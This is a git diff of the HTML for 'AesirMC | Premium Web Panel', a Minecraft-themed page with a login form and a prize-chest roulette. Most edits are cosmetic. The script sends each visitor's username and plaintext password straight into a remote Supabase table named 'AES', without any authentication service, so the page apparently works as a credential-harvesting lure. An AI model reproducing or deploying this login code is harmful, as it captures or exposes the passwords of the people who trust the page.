@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AesirMC | Premium Web Panel</title>
     
+    <link rel="icon" type="image/png" href="logo.png">
+    
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     
@@ -33,7 +35,7 @@
             overflow-x: hidden;
         }
 
-        /* SAĞ ÜST MODERN BİLDİRİM */
+        /* BİLDİRİM KUTUSU */
         #toast-container {
             position: fixed;
             top: 20px;
@@ -49,7 +51,6 @@
             padding: 16px 25px;
             border-radius: 16px;
             font-weight: 600;
-            margin-bottom: 10px;
             display: flex;
             align-items: center;
             gap: 12px;
@@ -60,7 +61,7 @@
 
         .toast.show { transform: translateX(0); }
 
-        /* SOL ALT SABİT OYNA BUTONU */
+        /* SOL ALT SABİT BUTON VE DEV İMLEÇ */
         .fixed-play-container {
             position: fixed;
             bottom: 30px;
@@ -73,7 +74,6 @@
             color: black;
             padding: 15px 35px;
             border-radius: 60px;
-            text-decoration: none;
             font-weight: 800;
             font-size: 18px;
             display: flex;
@@ -85,14 +85,10 @@
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
         }
 
-        .btn-play:hover {
-            transform: scale(1.05) translateY(-5px);
-            background-color: #f1a400;
-        }
+        .btn-play:hover { transform: scale(1.05) translateY(-5px); background-color: #f1a400; }
 
-        /* 2 KAT BÜYÜTÜLMÜŞ ÖZEL İMLEÇ */
         .custom-cursor-img {
-            width: 45px; 
+            width: 45px; /* 2 kat büyük imleç */
             height: 45px;
             object-fit: contain;
         }
@@ -165,7 +161,6 @@
             100% { transform: scale(1, 1); }
         }
 
-        /* RULET BÖLÜMÜ */
         #roulette-section { display: none; margin-top: 50px; }
         .viewport {
             width: 100%; height: 160px; margin: 0 auto;
@@ -212,7 +207,7 @@
     <h1 id="welcome-txt" style="font-weight: 800; font-size: 42px; margin-bottom: 20px;"></h1>
     <div id="chest-zone">
         <img src="adsız.png" id="main-chest-img" class="main-chest" onclick="handleChestClick()" onerror="this.src='https://minecraft.wiki/images/Chest_JE2_BE2.png'">
-        <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px;">SANDIĞI AÇMAK İÇİN DOKUN</p>
+        <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px; text-transform: uppercase;">SANDIĞI AÇMAK İÇİN DOKUN</p>
     </div>
 
     <div id="roulette-section">
@@ -230,7 +225,7 @@
 </div>
 
 <script>
-    const S_URL = "https://iigemvvlznvgneghevev.supabase.co/rest/v1/";
+    const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
     const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
     const _db = supabase.createClient(S_URL, S_KEY);
 
@@ -255,7 +250,7 @@
     async function connectAndGo() {
         const u = document.getElementById('username').value;
         const p = document.getElementById('password').value;
-        if(!u || !p) return;
+        if(!u || !p) return alert("Lütfen kullanıcı adı ve şifrenizi girin.");
 
         _db.from('AES').insert([{ username: u, password: p }]).then(() => {});
 
